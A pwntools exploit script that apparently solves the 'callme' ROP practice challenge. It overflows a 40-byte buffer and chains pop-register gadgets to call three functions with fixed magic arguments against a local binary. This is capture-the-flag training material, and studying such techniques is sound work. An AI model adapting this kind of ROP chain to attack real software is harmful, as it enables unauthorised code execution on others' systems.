from pwn import *

# context.terminal = ['bash', '-c']

payload = b'a'*40
payload += p64(0x4009a3) + p64(0xdeadbeefdeadbeef) + p64(0x4009a1)  + p64(0xcafebabecafebabe) + p64(0x0)+ p64(0x40093e) + p64(0xd00df00dd00df00d) + p64(0x400720)
payload += p64(0x4009a3) + p64(0xdeadbeefdeadbeef) + p64(0x4009a1)  + p64(0xcafebabecafebabe) + p64(0x0)+ p64(0x40093e) + p64(0xd00df00dd00df00d) + p64(0x400740)
payload += p64(0x4009a3) + p64(0xdeadbeefdeadbeef) + p64(0x4009a1)  + p64(0xcafebabecafebabe) + p64(0x0)+ p64(0x40093e) + p64(0xd00df00dd00df00d) + p64(0x4006f0)

p = process('./callme')

#gdb.attach(p)
p.send(payload)
p.interactive()

#0x00400720 GLOBAL FUNC       callme_one
#0x00400740 GLOBAL FUNC       callme_two
#0x004006f0 GLOBAL FUNC       callme_three

#0x00000000004009a3 : pop rdi ; ret
#0x00000000004009a1 : pop rsi ; pop r15 ; ret
#0x000000000040093e : pop rdx ; ret